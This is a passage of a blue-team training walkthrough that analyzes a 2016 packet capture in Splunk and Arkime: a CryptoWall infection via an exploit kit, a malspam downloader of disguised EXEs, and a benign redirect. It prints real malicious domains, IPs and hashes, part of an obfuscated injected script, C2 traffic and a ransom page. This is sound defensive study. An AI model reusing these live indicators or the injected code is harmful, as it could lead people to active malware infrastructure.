---
title: Alerts on 3 different hosts — EK drive-by to CryptoWall, a malspam JS downloader and a harmless redirect (Splunk first, Arkime second)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - exploit-kit
  - cryptowall
  - ransomware
  - js-downloader
---

# Alerts on 3 different hosts — EK drive-by to CryptoWall, a malspam JS downloader and a harmless redirect { #alerts-3-hosts }

!!! abstract "Case summary"
    malware-traffic-analysis.net **2016-01-07 "Alerts on 3 different hosts"**, written as a follow-along guide for the home-lab **pcapbox** VM: **Splunk (Zeek logs) as the main tool, Arkime only where Splunk cannot show contents**. The SOC sees "evil" alerts on three Windows 7 PCs within minutes. The job is to decide, for each PC, **what happened and whether it was infected**. The three PCs show three different patterns, so the case trains one key skill: **telling a real infection apart from an alert that went nowhere**.

| | |
|---|---|
| **Evidence** | `2016-01-07-traffic-analysis-exercise.pcap` — 2016-01-07 22:05:47 – 22:17:18 UTC (about 11.5 min) |
| **Source** | [malware-traffic-analysis.net 2016-01-07 "Alerts on 3 different hosts"](https://malware-traffic-analysis.net/2016/01/07/index.html) |
| **Given** | Nothing about the LAN. You find the range, gateway and PCs yourself |
| **Questions** | Time range · IP, MAC and host name of each of the 3 PCs · what happened on each PC and whether it was infected · follow-up recommendations |
| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, case field `pcap_case`), Arkime (tag = case name), Snort 2.9.20. **No Wireshark.** |
| **Case name** | `20160107_ALERTS_ON_3_DIFFERENT_HOSTS` |
| **Related pages** | [Sorting through the alerts (same method, one PC)](socgholish-fake-chrome-update-wscript-c2.md) · [Phishing red herring to EK drive-by](phishing-red-herring-ek-driveby-ursnif-c2.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) |

!!! tip "How to use this page"
    Work it in order. Each step is **Goal → Splunk query (explained line by line) → what you should see → reading the result**. Arkime appears only where Splunk cannot show a page or a body.

    The result blocks were prepared from the same PCAP before you run anything. **Hosts, times, URIs and sizes should match exactly. Totals (for example the number of `conn` lines) can differ by a few** because tools split UDP and retried connections differently. If a key row is different, stop and check your case name and time range first.

    Labels: **[data]** = seen in Splunk or Arkime, **[inference]** = a conclusion that still needs proof.

!!! warning "The indicators on this page are real"
    Domains, IPs and hashes come from real 2016 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep the values you type. **Do not visit them.** Do not run anything you extract.

??? success "Answers — open only after you finish"
    | PC | IP / MAC / host name | What happened | Infected? |
    |---|---|---|---|
    | A | 192.168.122.132 · 48:5b:39:c1:f2:48 · **Hokaydoo-PC** | Google result → hacked `www.koeppl[.]com` → exploit kit on `*.securetopc[.]top` (Flash exploit, encrypted payload) → **CryptoWall** check-ins to hacked sites → user opened the **"Decrypt service"** ransom page | **Yes — ransomware** |
    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | Yahoo webmail → 6 s later a script (`MSIE 7.0` User-Agent) downloads Windows EXEs **labelled `.gif`** from 3 hacked sites, 6 times | **Yes — malware downloaded** (follow-up traffic not seen) |
    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo search → `planetside.co[.]uk` with an injected script → gate `st.domandvilma[.]com` replied with an **empty** value → nothing followed | **No** — alert only |

---

## Step 0 — Load the PCAP and check the case { #prep }

**Goal:** give the PCAP a case name so its logs never mix with other exercises, and set every tool to **UTC**.

1. Rename the file to **`20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap`** and copy it to `\\10.50.10.60\incoming`.
2. On pcapbox, wait for `DONE case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS` in `tail -f /data/logs/ingest.log`. **Load it once only** — loading it again puts every log in twice.
3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → Timezone = UTC**, time range **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — the index (Splunk's "drawer") that holds the Zeek logs.
- `sourcetype=zeek:conn` — the connection log: one line per connection.
- `|` — pass the results on to the next command.
- `stats count by pcap_case` — count lines for each case name. Your new case must be in the list.

!!! note "Time: use `ts`"
    Zeek's own event time is **`ts`** (epoch seconds). The queries sort and print with `ts`; `eval t=strftime(ts,"%H:%M:%S")` makes it readable.

---

## Step 1 — Baselining: what is normal in this capture { #baseline }

Baselining = learning what is **normal** first: time range, log types, which PCs exist, who they are and how they normally browse. Only then do "odd" things stand out.

### 1-1. Which logs exist { #log-types }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats count by sourcetype
| sort - count
```

- No `sourcetype` → every log type of this case. `sort - count` = largest first.

**What you should see (order, not exact counts):** `zeek:conn`, `zeek:dns`, `zeek:http` (about 325 lines), `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, possibly `zeek:weird`, `zeek:pe`.

**[data] Reading:**

- **`zeek:dhcp` is there** — the PCs asked for their IP addresses during the capture, so DHCP gives name, MAC and IP directly (1-4).
- **No `kerberos`, `ldap`, `smb_*`** — no Active Directory domain. These are stand-alone PCs; there is no user name to find.
- **`zeek:http` is large** — lots of clear-text web traffic you can read in full. Good news for this case.
- **`zeek:pe`** (if you have it) means Zeek saw a **Windows program (EXE/DLL) inside the traffic**. In a normal office capture that is rare. Note it.

### 1-2. Capture window { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- Line 2: one summary row — earliest and latest connection start, number of connections. `as` names the result.
- Line 3: minutes, one decimal. **Must come before line 4** — after line 4 `first`/`last` are text and cannot be subtracted.
- Line 4: epoch → readable date.

**What you should see:** `first` **2016-01-07 22:05:47**, `last` about **22:17** (the last connection **start**; the last packet is 22:17:18), about **11.5 minutes**, roughly 470 connections.

### 1-3. Which internal IPs start connections { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.0.0/16
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h
| eval first=strftime(first,"%H:%M:%S")
| sort first
```

- `id_orig_h` = the IP that **started** the connection (`orig` = originator, `resp` = responder, `_h` = host, `_p` = port).
- `id_orig_h=192.168.0.0/16` — Splunk understands an IP range (CIDR) on IP fields: only private 192.168.x.x senders.
- `dc()` = distinct count. `orig_bytes` / `resp_bytes` = payload bytes each side sent.

**What you should see (counts approximate):**

```text
id_orig_h         sessions  destinations  first
192.168.122.130   ~130      ~30           22:05:51
192.168.122.52    ~220      ~25           22:06:06
192.168.122.132   ~120      ~25           22:06:25
(192.168.122.1 may add a line or two for DHCP replies, or not appear at all)
```

**[data] Reading:**

- **LAN = 192.168.122.0/24.** Three PCs: **.130, .52, .132**.
- **192.168.122.1** starts almost nothing. It is the **gateway, DHCP server and DNS server** (confirmed in 1-4 and 1-6).
- The three PCs start one after another (22:05:51, 22:06:06, 22:06:25) — they were switched on at the start of the capture.

### 1-4. Who is who — DHCP { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval t=strftime(ts,"%H:%M:%S")
| table t client_addr assigned_addr mac host_name msg_types server_addr
| sort t
```

- `zeek:dhcp` = one line per DHCP exchange. `assigned_addr` = the IP the server gave; `mac` = the PC's network card; `host_name` = the name the PC sent (DHCP option 12).
- `msg_types`: **REQUEST/ACK** = "may I use this IP?" / "yes"; **INFORM/ACK** = "I already have an IP, give me settings".

**What you should see:**

```text
t         client_addr      assigned_addr    mac                 host_name         msg_types
22:05:47                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
22:05:54  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
22:06:02                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
22:06:10  192.168.122.52                    00:26:55:32:a9:17   Jennifer-PC       INFORM ACK
22:06:21                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
22:06:29  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
...       (a second INFORM from .132 at 22:10:45 and from .130 at 22:11:53)
```

**[data] Reading:** three names, three MACs, three IPs. `server_addr` is **192.168.122.1**. These answer question 2 of the exercise.

| IP | MAC | Host name |
|---|---|---|
| 192.168.122.130 | 00:22:19:e2:4b:86 | FULL-METAL-JACK |
| 192.168.122.52 | 00:26:55:32:a9:17 | Jennifer-PC |
| 192.168.122.132 | 48:5b:39:c1:f2:48 | Hokaydoo-PC |

!!! question "Question: why did .132 and .130 send a second DHCP INFORM later?"
    Windows sends INFORM when something asks for network settings again — a new network check or a program starting. On its own it means nothing. Note the times (22:10:45 and 22:11:53) and see whether anything else happens around them. (Spoiler-free hint: both are within seconds of something interesting in Step 3 and Step 4.)

### 1-5. What each PC runs — User-Agents { #user-agents }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(host) as sites by id_orig_h user_agent
| sort id_orig_h first
```

- `user_agent` = the name a program gives itself in each HTTP request. A browser has one; other programs have their own.
- `eval host=mvdedup(host)` — keeps one copy of `host` (the pcapbox Splunk once stored it twice; the habit does no harm).
- `stats … by id_orig_h user_agent` = one row per **PC + program** pair.

**What you should see:**

```text
id_orig_h        user_agent                                                                  first     count  sites
192.168.122.130  Microsoft NCSI                                                              22:05:58  1      1
192.168.122.130  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)            22:07:00  1      1
192.168.122.130  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; ...)  22:11:53  9      3
192.168.122.132  Microsoft NCSI                                                              22:06:33  1      1
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  81     9
192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR ...; rv:11.0) like Gecko  22:10:26  1  1
192.168.122.132  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)  22:10:47  4      2
192.168.122.52   Microsoft NCSI                                                              22:06:13  1      1
192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  ~190   ~15
```

**[data] Reading:**

- `Windows NT 6.1` = **Windows 7** on all three. `Microsoft NCSI` = Windows checking "am I online?" at start-up — normal.
- Browsers: .130 **IE 10**, .52 **IE 9**, .132 **IE 11** (`Trident/7.0; rv:11.0`, 64-bit Windows: `WOW64`).
- **Two PCs later show "MSIE 7.0"** (.130 at 22:11:53, .132 at 22:10:47). IE 7 is from 2006. On Windows 7 this string is the default User-Agent of **Windows' own HTTP objects used by scripts and programs** (WScript, many malware families) — **not the user's browser**. Candidate.
- **.132 has a third User-Agent used once** (22:10:26): IE 11 with extra `.NET CLR` parts. A different program made that one request. Candidate.

### 1-6. DNS servers { #dns-servers }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_resp_p=53
| stats count by id_orig_h id_resp_h
```

**What you should see:** .130 and .52 ask **192.168.122.1**; **.132 asks 8.8.8.8 and 8.8.4.4** (Google). [data] Someone set .132's DNS by hand. Not malicious by itself, but it means a DNS log on the gateway would **miss** .132's lookups — worth one line in the report.

**Baseline notes — candidates, no conclusions yet:**

1. 22:10:26 — .132, a one-time IE 11 variant User-Agent
2. 22:10:47 — .132, `MSIE 7.0`
3. 22:11:53 — .130, `MSIE 7.0`

---

## Step 2 — What each PC visited: remove the normal { #triage }

### 2-1. HTTP sites per PC, in time order { #http-per-pc }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host
| sort id_orig_h first
```

- `host` = the HTTP Host header (the site name). `method`: **GET** fetch, **POST** send.
- `response_body_len` = bytes the server returned (after unzipping).

**What you should see (key rows):**

```text
id_orig_h        host                                     first     count  methods    received
192.168.122.130  www.msftncsi.com                         22:05:58  1      GET
192.168.122.130  mail.yahoo.com                           22:07:00  1      GET
192.168.122.130  ma-wt.com.sa                             22:11:53  3      GET        375301
192.168.122.130  dariostoka.com                           22:11:55  3      GET        375301
192.168.122.130  freshanointingministries-sc.org          22:11:57  3      GET        406541
192.168.122.132  www.msftncsi.com                         22:06:33  1      GET
192.168.122.132  www.google.com.au                        22:10:08  1      GET
192.168.122.132  www.koeppl.com                           22:10:10  55     GET
192.168.122.132  translate.google.com / pbs.twimg.com / stats.g.doubleclick.net / joomla-gtranslate.googlecode.com   (1 each)
192.168.122.132  uacltr.securetopc.top                    22:10:15  3      GET        84264
192.168.122.132  gbesbsdsb.securetopc.top                 22:10:23  2      GET        421888
192.168.122.132  bizsouls.com                             22:10:47  3      POST       123682
192.168.122.132  estudiobarco.com.ar                      22:12:14  1      POST       6
192.168.122.132  3wzn5p2yiumh7akj.waytopaytosystem.com    22:16:46  17     GET POST
192.168.122.52   www.msftncsi.com                         22:06:13  1      GET
192.168.122.52   au.search.yahoo.com / l.yimg.com / ri.search.yahoo.com   22:08:49   (Yahoo search)
192.168.122.52   planetside.co.uk                         22:09:12  ~80    GET POST
192.168.122.52   st.domandvilma.com                       22:09:24  1      GET        26
192.168.122.52   ajax.googleapis.com / ajax.aspnetcdn.com / www.google-analytics.com   (site resources)
192.168.122.52   www.outdoorsamoa.com / www.tripadvisor.com / fonts.* / static.tacdn.com   22:15:29 …
```

**How to remove the normal:**

1. Windows itself: `msftncsi.com`.
2. Big known services and their parts: Google (`google.*`, `gstatic`, `googleapis`, `google-analytics`, `doubleclick`), Yahoo (`yahoo.com`, `yimg.com`), Twitter (`twimg.com`), Microsoft CDN (`aspnetcdn.com`), TripAdvisor (`tripadvisor.*`, `tacdn.com`, `jscache.com`).
3. A site the user clearly chose (search result, typed address) and the resources it loads under its own name.

**[data] What is left:**

| PC | Left over | Why it is odd |
|---|---|---|
| .132 | `uacltr.securetopc.top`, `gbesbsdsb.securetopc.top` | Random sub-domains on a `.top` domain, seconds after a normal site |
| .132 | `bizsouls.com`, `estudiobarco.com.ar` | **POST only**, by the `MSIE 7.0` program (candidate 2) |
| .132 | `3wzn5p2yiumh7akj.waytopaytosystem.com` | 16 random characters + "way to pay to system" |
| .130 | `ma-wt.com.sa`, `dariostoka.com`, `freshanointingministries-sc.org` | Three unrelated sites, same 3-request pattern, ~375–406 KB each, by `MSIE 7.0` (candidate 3) |
| .52 | `st.domandvilma.com` | Not part of the site the user opened; only **26 bytes** returned |

### 2-2. Destinations with no DNS lookup — and why nothing shows here { #no-dns }

In the previous case this query found the C2. Try it — knowing **when a method finds nothing** is part of the skill.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.0/24 proto=tcp NOT id_resp_h=192.168.0.0/16
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| stats count by id_orig_h id_resp_h id_resp_p
```

- The `[ … ]` **subsearch** runs first and collects every IP seen in DNS answers (`mvexpand` = one row per value; `rename` = match the conn field name). `NOT` keeps only TCP destinations **never** looked up.

**What you should see:** **No results.** [data] Every external TCP destination was reached by name. All malicious activity in this capture uses **domains**, so HTTP and DNS (Step 2-1) are the right place to look — not "hard-coded IP" hunting.

**Plan:** one PC at a time, most serious first: **.132** (three kinds of odd traffic) → **.130** → **.52**.

---

## Step 3 — PC A: 192.168.122.132 Hokaydoo-PC { #pc-a }

### 3-1. The chain, with the Referer { #pc-a-chain }

The **Referer** header says "I came from this page". Following it shows which page called which. (HTTP spells it *Referer*; Zeek names the field `referrer`.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 ts>=1452204600
| eval host=mvdedup(host)
| search NOT host IN ("*google*","*twimg.com","*doubleclick.net","*googlecode.com") NOT uri="*.css*" NOT uri="*.png*" NOT uri="*.jpg*" NOT uri="*.gif*" NOT uri="*.js*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- `ts>=1452204600` = from **22:10:00 UTC** (epoch seconds; `| makeresults | eval x=strftime(1452204600,"%H:%M:%S")` shows it).
- `host IN ("*google*", …)` — `IN` with wildcards; with `NOT` it hides the noise (also the Google result click at 22:10:08, `www.google.com.au/url?…url=http%3A%2F%2Fwww.koeppl.com%2F`, which you saw in 2-1). The `uri` filters hide images, styles and scripts of the normal site.
- `resp_mime_types` = Zeek's guess **from the content**, not from the server's label.

**What you should see:**

```text
t              host                         uri                                                        referrer                                              status  resp_mime_types              response_body_len
22:10:10.863   www.koeppl.com               /                                                          http://www.google.com.au/url?sa=t&rct=j…            200     text/html                    62939
22:10:15.930   uacltr.securetopc.top        /1993/10/14/madness/willow/dick-sort-southward-swallow.html http://www.koeppl.com/                               200     text/html                    1035
22:10:16.598   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            -       -                            0
22:10:17.300   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            200     application/x-shockwave-flash 83229
22:10:23.164   gbesbsdsb.securetopc.top     /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock   http://uacltr.securetopc.top/1993/10/14/…   200     -       0
22:10:26.229   gbesbsdsb.securetopc.top     /officer/1277929/tidings-humble-communication              -                                                     200     -  (or application/octet-stream)  421888
22:10:47.545   bizsouls.com                 /XG3vxT.php?y=21657wkalasvbb                               -                                                     200     text/plain                   14
22:10:51.876   bizsouls.com                 /XG3vxT.php?c=a2py731nhw                                   -                                                     200     text/plain                   123668
22:11:11.746   bizsouls.com                 /XG3vxT.php?o=py8nr3ezh06q03o                              -                                                     200     -                            0
22:12:14.456   estudiobarco.com.ar          /5TFv7E.php?z=py8nr3ezh06q03o                              -                                                     200     text/plain                   6
22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                        -                                                     200     text/html                    3289
22:16:49.853   3wzn5p2yiumh7akj.waytopaytosystem.com   /picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155   http://3wzn5p2yiumh7akj…/1f96s0p          200     image/…
22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                               http://3wzn5p2yiumh7akj…/1f96s0p                     200     text/html                    14463
```

**[data] Reading, line by line:**

1. **22:10:08–10 — the user clicked a Google result** for `www.koeppl.com` (a German motor-equipment shop). A normal visit, Referer = Google.
2. **22:10:15 — the koeppl page called a stranger.** `uacltr.securetopc.top` has **Referer `http://www.koeppl.com/`**: something inside the koeppl page sent the browser there. **[inference]** The site is **compromised** (3-2 proves it).
3. **The path looks like a blog post made of random words and a date** (`/1993/10/14/madness/willow/…html`). Random words in paths, a cheap `.top` domain and two random sub-domains on one IP are typical of **exploit kit (EK)** landing pages in late 2015 / early 2016.
4. **22:10:16–17 — a Flash file (`.swf`, 83 KB)** loaded by the landing page. The first request got no answer, the browser asked again. EKs used Flash bugs to run code just by viewing a page.
5. **22:10:26 — 421,888 bytes with no Referer and a different User-Agent** (candidate 1). Not the browser: **the exploit's own code** downloading its payload. Zeek finds **no file type** in it — the payload is **encrypted** on the wire (it is decrypted on the PC), so it does not start with `MZ`.
6. **22:10:47 — 21 s later, a new program (`MSIE 7.0`, candidate 2) POSTs to `bizsouls.com`** three times, then to `estudiobarco.com.ar`. Random `.php` names with one-letter parameters, short replies of **hex text** — a malware **check-in to hacked websites** used as C2 relays.
7. **22:16:46 — a page on `…waytopaytosystem.com`**, opened by the browser (IE 11 User-Agent): the user typed or clicked an address from somewhere on the PC. Step 3-4 shows what it is.

!!! question "Question: what does the DHCP INFORM at 22:10:45 mean?"
    Look back at 1-4: .132 sent a DHCP INFORM at **22:10:45** — **2 s before** the first `MSIE 7.0` POST (22:10:47). A freshly started program asking Windows for network settings fits a new process starting. It supports, but does not prove, that the payload ran.

### 3-2. The hacked site — injected code before `<html>` (Arkime) { #pc-a-inject }

Zeek keeps summaries, **not page contents**. Open the koeppl page in Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
```

Expand the session (`+`), choose **natural** and **uncompress**, scroll to the **response body** (it is gzip-compressed on the wire).

```text
<style>.kjpxhkghapgcgt { position: absolute; top: -1357px; left: -1125px}</style>
<div id="nvjgnbocfpotc" class="kjpxhkghapgcgt">a fa e bceid: fb, ocdbf ekdjcpajdcaecrbqbxcpbsed a ucdbdcp b j; dgahaacsera z 'b' ubmaoa ...</div>
<script>
var pxzqxmmylyy=(563738144>878824873?"\x65":"re");
var scestqiccnik=(75811078+892246232<544535642+1517287702?"\x72\x65":"px");
...
</script>
<!DOCTYPE html ...>
<html ...>
```

**[data] Reading:**

- A real web page starts with `<!DOCTYPE html>` or `<html>`. Here **~25 KB of junk comes first**: a `<style>` that moves a `<div>` far off the screen (`top:-1357px`) and a `<div>` full of nonsense letters.
- Then a `<script>` that builds words from tiny pieces (`"re"+"turn Str"+"ing"` …) — **obfuscation**, so that the word "securetopc" never appears in plain text.
- The script reads the hidden letters and turns them into the landing-page address. **[data]** This is why the browser went to `uacltr.securetopc.top` with Referer `koeppl.com`.

You do not need to decode it: the next request (Referer = koeppl, 5 s later) already shows where it went. **Code before `<html>` on a normal site = injected.**

### 3-3. Exploit kit and payload — files (Splunk) { #pc-a-files }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS tx_hosts="89.38.144.75"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `zeek:files` = one line per file Zeek saw in the traffic. `tx_hosts` = sender, `rx_hosts` = receiver, `mime_type` = type **from the content**, `md5` = fingerprint.
- `89.38.144.75` = the server of both `securetopc.top` names (check: `index=zeek sourcetype=zeek:dns query="*securetopc.top" | table ts query answers`).

**What you should see:**

```text
t         tx_hosts      rx_hosts         mime_type                       seen_bytes  md5
22:10:15  89.38.144.75  192.168.122.132  text/html                       1035        946f2af6be0d796430b590ad5ee48be5
22:10:17  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
22:10:26  89.38.144.75  192.168.122.132  (empty)                         421888      dd5ecd6f928fc4f988996feb5b292879
```

**[data] Reading:** Flash exploit → encrypted payload (no type, ~412 KB). The MD5 of the payload is of the **encrypted** bytes, not of the program on disk — searching it in a malware database usually finds nothing.

**[inference] Which exploit kit?** Random date-and-words paths, `.html.swf` names, a `.top` domain with two random sub-domains, a payload path of a word + number + words and an encrypted payload match how **Neutrino EK** looked in January 2016. The original exercise identified the EK from IDS alerts, which you do not have here — write "EK (pattern matches Neutrino)", not a confirmed name.

### 3-4. After the payload: check-ins and a ransom page { #pc-a-post }

**Check-ins (Splunk):**

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h host uri user_agent request_body_len response_body_len
```

```text
t         id_resp_h        host                                   uri                             request_body_len  response_body_len
22:10:47  188.138.101.154  bizsouls.com                           /XG3vxT.php?y=21657wkalasvbb    131               14
22:10:51  188.138.101.154  bizsouls.com                           /XG3vxT.php?c=a2py731nhw        113               123668
22:11:11  188.138.101.154  bizsouls.com                           /XG3vxT.php?o=py8nr3ezh06q03o   124               0
22:12:14  50.22.11.55      estudiobarco.com.ar                    /5TFv7E.php?z=py8nr3ezh06q03o   124               6
22:16:57  95.128.181.144   3wzn5p2yiumh7akj.waytopaytosystem.com  /1f96s0p                        (captcha form)    14463
```

In Arkime the bodies look like this:

```text
POST /XG3vxT.php?y=21657wkalasvbb HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
Host: bizsouls.com

b=31793872756d7071786e3391b3073aac2a423df8a3b5afb9cb38c907fba895a77d264b81ad...
```

**[data] Reading:** one letter `=` long hex, and the reply is hex too (`39187820a48aa9`; the second reply is **124 KB of hex**). Encrypted C2. The last two POSTs (`o=` to bizsouls and estudiobarco) carry **the same body** — the program tried a second relay with the same message.

**The page on `waytopaytosystem.com` (Arkime):**

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
```

Open the session with the **POST `/1f96s0p`** (14,463-byte reply), natural + uncompress. The text reads (shortened):

```text
<title>Decrypt service</title>
Your files are encrypted. To get the key to decrypt files you have to pay 500 USD.
If payment is not made before 14/01/16 - 16:16 the cost of decrypting files will increase 2 times ...
Your system: Windows 7 ( x64 )   First connect IP: 103.12.9.206
We are present a special software - CryptoWall Decrypter - ...
Send BTC to Bitcoin address: ...   1.14 BTC ~= 500 USD
```

**[data] This is a CryptoWall ransom payment page**, reached through a Tor gateway (`tor2web-header` in the page code). The first GET showed a captcha ("enter the code from the picture" — `picture.php`), the POST sent the code, and the reply is the payment page. **The user saw a ransom note on their PC and followed its instructions.**

**Conclusion for PC A:**

- **[data]** Hacked site → EK landing → Flash → encrypted payload → new `MSIE 7.0` program checking in to hacked sites → the user opened the CryptoWall payment page. "Windows 7 (x64)" on the page matches this PC.
- **[inference]** Files on Hokaydoo-PC are encrypted by **CryptoWall**. Network shares it could write to may also be affected.

---

## Step 4 — PC B: 192.168.122.130 FULL-METAL-JACK { #pc-b }

### 4-1. Webmail, then a script { #pc-b-timeline }

```spl
index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 (sourcetype=zeek:ssl OR sourcetype=zeek:http) ts>=1452204300
| eval name=coalesce(server_name, mvdedup(host))
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first max(t) as last count by sourcetype name
| sort first
```

- Two log types at once: `(sourcetype=zeek:ssl OR sourcetype=zeek:http)`. `ts>=1452204300` = from 22:05:00.
- `coalesce(a,b)` = take `a`, or `b` if `a` is empty. HTTPS rows have `server_name` (the **SNI**, the site name sent before encryption); HTTP rows have `host`.

**What you should see (key rows):**

```text
sourcetype  name                              first     last
zeek:ssl    www.bing.com                      22:06:35  22:06:59
zeek:http   mail.yahoo.com                    22:07:00  22:07:00
zeek:ssl    login.yahoo.com                   22:07:05  22:07:33
zeek:ssl    us-mg5.mail.yahoo.com             22:07:00  22:11:47
zeek:ssl    prodxobni.mail.yahoo.com / ws-contacts / comet.yahoo.com ...
zeek:http   ma-wt.com.sa                      22:11:53  22:12:30
zeek:http   dariostoka.com                    22:11:55  22:12:34
zeek:http   freshanointingministries-sc.org   22:11:57  22:12:47
```

**[data] Reading:**

- 22:06–22:07: Bing, then the user **logs in to Yahoo Mail** (`login.yahoo.com`) and uses it (`us-mg5.mail.yahoo.com`). Webmail is HTTPS — **you cannot see the emails or attachments**.
- **22:11:45–47** last webmail connections → **22:11:53**, 6 s later, the `MSIE 7.0` program starts (candidate 3). The DHCP INFORM from 1-4 is at 22:11:53 too.
- **[inference]** The user opened something from an email (an attachment) and a **script** ran. The `MSIE 7.0` User-Agent with no Referer fits Windows Script Host (`.js` file).

### 4-2. The downloads: "GIF" files that are programs { #pc-b-downloads }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 uri="/counter/*"
| eval host=mvdedup(host)
| rex field=uri "rnd=(?<rnd>\d+)"
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
```

- `uri="/counter/*"` — only these requests.
- `rex field=uri "rnd=(?<rnd>\d+)"` — cut the number after `rnd=` into a new field `rnd` (`\d+` = one or more digits).
- `resp_filenames` = the file name the server suggested (`Content-Disposition: attachment; filename=…`). `resp_mime_types` = what Zeek found **inside**.

**What you should see:**

```text
t         id_resp_h       host                              rnd      status  resp_filenames        resp_mime_types         response_body_len
22:11:53  216.158.85.7    ma-wt.com.sa                      8742951  200                                                   0
22:11:55  174.36.186.235  dariostoka.com                    8742951  200     775d4.gif                                     0
22:11:57  184.168.173.1   freshanointingministries-sc.org   8742951  200                                                   0
22:11:58  216.158.85.7    ma-wt.com.sa                      8742952  200     66b32.gif             application/x-dosexec   260613
22:12:04  174.36.186.235  dariostoka.com                    8742952  200     174125.gif            application/x-dosexec   260613
22:12:21  184.168.173.1   freshanointingministries-sc.org   8742952  200     c9a63078fe7d3741.gif  application/x-dosexec   260619
22:12:30  216.158.85.7    ma-wt.com.sa                      8742953  200     250acae.gif           application/x-dosexec   114688
